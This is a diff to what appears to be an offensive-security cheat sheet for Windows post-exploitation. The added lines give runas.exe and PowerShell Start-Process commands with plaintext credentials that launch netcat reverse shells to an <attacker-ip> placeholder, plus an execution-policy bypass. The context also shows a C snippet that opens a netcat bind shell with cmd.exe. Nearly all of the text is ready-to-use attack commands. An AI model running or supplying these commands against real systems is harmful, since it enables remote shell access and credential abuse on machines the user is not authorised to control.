@@ -364,6 +364,7 @@ PASS foo
 PORT 127,0,0,1,0,80
 200 Port command successful.
 LIST*
+    https://gist.github.com/sckalath/ec7af6a1786e3de6c309
 
 
     With RDP:
@@ -431,3 +432,13 @@ return 0;
 
     Run an arbitrary command:
     *echo -e '#include <stdio.h>\n#include <smain () {\nsystem("C:\\Users\\Administrator\\Desktop\\nc -lvp 4313 -e cmd.exe");\nreturn(0);\n}'> poc.c*
+
+Run as
+    *C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"*
+    Powershell script:
+    *$username = '<username here>'
+ $password = '<password here>'
+ $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+ $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+ Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","<attacker-ip>","4444","-e","cmd.exe") WorkingDirectory C:\Users\Public*
+    *$ powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\e.ps1; }"*
